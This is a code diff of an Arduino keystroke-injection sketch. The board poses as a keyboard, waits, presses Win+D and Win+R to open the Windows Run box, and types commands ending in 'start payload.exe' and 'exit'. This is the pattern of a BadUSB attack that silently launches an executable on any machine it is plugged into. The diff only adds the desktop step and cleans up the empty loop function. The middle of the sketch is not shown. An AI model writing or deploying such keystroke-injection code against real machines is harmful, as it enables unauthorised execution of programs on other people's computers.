@@ -3,6 +3,10 @@ void setup(){
   Keyboard.begin();
   delay(10000);
   Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('d');
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(100);
@@ -25,11 +29,6 @@ void setup(){
   Keyboard.println("start payload.exe");
   Keyboard.println("exit");
   Keyboard.end();
-
 }
 
-
-void loop() {
-  // put your main code here, to run repeatedly:
-
-}
+void loop(){}
